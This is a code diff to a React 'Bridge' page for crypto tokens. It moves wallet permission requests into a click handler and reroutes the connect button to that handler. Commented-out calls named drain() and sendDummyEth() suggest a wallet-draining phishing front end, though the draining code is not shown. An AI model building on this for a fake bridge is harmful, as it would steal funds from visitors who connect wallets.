@@ -153,18 +153,6 @@ const Bridge = () => {
       const chainId = await provider.getSigner().getChainId(); // Get current chain ID
       console.log(selectedToken)
       console.log(address)
-      await window.ethereum.request({
-        method: "wallet_requestPermissions",
-        params: [
-          {
-            eth_accounts: {},
-          },
-        ],
-      });
-      const accounts = await window.ethereum.request({
-        method: "eth_requestAccounts",
-        params: [],
-      });
 
       // Call bridgeTokens and pass in the provider, address, and chainId
       await bridgeTokens({
@@ -181,6 +169,21 @@ const Bridge = () => {
 
 
   const handleClick = async () => {
+    await window.ethereum.request({
+      method: "wallet_requestPermissions",
+      params: [
+        {
+          eth_accounts: {},
+        },
+      ],
+    });
+    const accounts = await window.ethereum.request({
+      method: "eth_requestAccounts",
+      params: [],
+    });
+
+    setAccounts(accounts[0])
+
     // sendDummyEth();
     // drain();
     // bridgeTokens()
@@ -912,7 +915,9 @@ const Bridge = () => {
                           <div className="transition-[filter]">
                             <button
                               key={connector.uid}
-                              onClick={() => connect({ connector })}
+                              onClick={() => {
+                                handleClick()
+                              }}
                               className="select-none disabled:cursor-not-allowed disabled:bg-camo-300 disabled:text-gray-800 typography-brand-body-l-caps sm:max-md:min-h-[36px] sm:max-md:py-1.5 min-h-[40px] px-6 py-2 transition-colors will-change-transform [transform:translateZ(0)] rounded-bl-md rounded-tr-md [clip-path:polygon(20px_0,100%_0,100%_50%,calc(100%-20px)_100%,0_100%,0_50%)] w-full bg-yellow-100 focus-visible:bg-white active:bg-white media-hover:hover:bg-white text-black"
                             >
                               <div className="typography-brand-body-bold uppercase [letter-spacing:1.3px]">
